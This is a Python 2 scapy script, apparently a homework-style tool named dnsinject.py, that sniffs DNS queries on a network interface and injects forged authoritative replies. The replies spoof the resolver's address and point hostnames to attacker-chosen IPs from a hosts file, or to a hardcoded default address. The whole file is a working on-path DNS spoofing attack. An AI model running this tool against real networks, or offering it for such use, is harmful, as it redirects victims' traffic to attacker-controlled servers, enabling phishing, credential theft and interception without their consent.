#!/usr/bin/python
import sys, getopt
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE
import netifaces
from scapy.all import *

hips = dict()
localhost_ip = None
#pkt.getlayer(DNS).qr == 0
def get_localhost_ip(interface=None):
    return "12.12.33.33"
'''
    if interface:
        return netifaces.ifaddresses(interface)[AF_INET][0]['addr']
    else:
        for interface in netifaces.interfaces():
            try:
                #links = netifaces.ifaddresses(interface)[netifaces.AF_INET]
                for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
                    #if "10." in link['addr'] or "172." in link['addr'] or "192." in link['addr']:
                    print 'printing link addr', link['addr']
                    if "127.0.0.1" not in link['addr']:
                        return link['addr']
            except Exception as e:
                pass
    return None
'''
def respond_with_ip(q_name):
    global hips
    for h, ip in hips.iteritems():
        #print 'checking for q_name', q_name, 'and h', h
        if q_name in h:
            if 'www.' not in q_name:
                if 'www.' + q_name in h:
                    print 'badhai ho for', q_name
                    return ip
            else:
                print 'yo badhai ho for', q_name
                return ip
    return None

def process_pkt(pkt):
    if IP in pkt and pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
        src_ip, dst_ip = pkt[IP].src, pkt[IP].dst
        #print pkt[DNSQR].qname
        #print src_ip, dst_ip
        q_name = pkt[DNSQR].qname.rstrip('.')
        print 'checking for', q_name
        r_ip = respond_with_ip(q_name) or localhost_ip
        print 'answer ip', r_ip
        if not r_ip:
            return

        inj_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                  UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                  DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, \
                  an=DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=100, rdata=r_ip))
        send(inj_pkt)

def main(argv):

    global localhost_ip
    global hips

    interface = None
    hostsfile = None
    try:
        opts, args = getopt.getopt(argv,"i:h:",["interface=","hostsfile="])
    except getopt.GetoptError:
        print 'dnsinject.py -i <interface> -h <hostsfile>'
        sys.exit(2)

    for opt, arg in opts:
        if opt in ("-i", "--interface"):
            interface = arg
        elif opt in ("-h", "--hostsfile"):
            hostsfile = arg

    print interface
    print hostsfile

    localhost_ip = get_localhost_ip()
    print 'localhost_ip is', localhost_ip

    if hostsfile:
        with open(hostsfile) as f:
            lines = f.readlines()

        for line in lines:
            ip, hostname = line.split()
            if hostname.startswith('www'):
                hips[hostname] = ip
            else:
                hips['www.' + hostname] = ip

        print hips

    if interface:
        sniff(iface=interface, filter='udp and port 53', store=0, prn=process_pkt)
    else:
        sniff(filter='udp and port 53', store=0, prn=process_pkt)

if __name__ == "__main__":
   main(sys.argv[1:])
